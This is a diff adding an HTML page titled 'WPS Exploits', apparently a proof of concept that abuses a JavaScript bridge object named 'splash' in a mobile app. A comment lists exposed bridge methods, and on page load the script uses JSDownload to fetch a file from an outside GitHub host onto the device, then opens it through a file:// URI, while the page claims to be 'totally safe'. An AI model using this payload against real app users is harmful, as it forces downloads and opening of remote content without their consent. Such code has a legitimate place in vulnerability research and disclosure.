@@ -1,0 +1,53 @@
+<!doctype html>
+<html lang="en">
+
+<head>
+    <!-- Required meta tags -->
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+
+    <!-- Bootstrap CSS -->
+    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.4.1/css/bootstrap.min.css"
+        integrity="sha384-Vkoo8x4CGsO3+Hhxv8T/Q5PaXtkKtu6ug5TOeNV6gBiFeWPGFN9MuhOf23Q9Ifjh" crossorigin="anonymous">
+
+
+    <script src="https://code.jquery.com/jquery-3.1.1.min.js"></script>
+    <title>WPS Exploits</title>
+</head>
+<!-- 
+JSDownload
+JSGetClientInfo
+JSGetPaymentWay
+JSIntentSchemeURI
+JSSupportLaunchDeeplink
+collectData
+collectDataV3
+goToLoginAndCallBackUserInfo
+jsOpenDefinedInterface -> new file , user
+jsOpenFile
+requestSession
+requestSessionUserInfo
+shareWx
+startTask
+ -->
+
+<body>
+    <h1>WPS Exploits!!</h1>
+    <h2> This is a totally safe page, nothing bad is happening</h2>
+    <script type="text/javascript">
+        $(document).ready(function () {
+            downloadRemoteFile();
+            setTimeout(function() { openRemoteFile(); }, 5000);
+        });
+
+        function downloadRemoteFile() {
+            splash.JSDownload("test", "https://raw.githubusercontent.com/robertprast/robertprast.github.io/master/index.html")
+        }
+
+        function openRemoteFile() {
+            splash.JSJumpURI('test', 'file:///sdcard/Download/index.html', '{}')
+        }
+    </script>
+</body>
+
+</html>
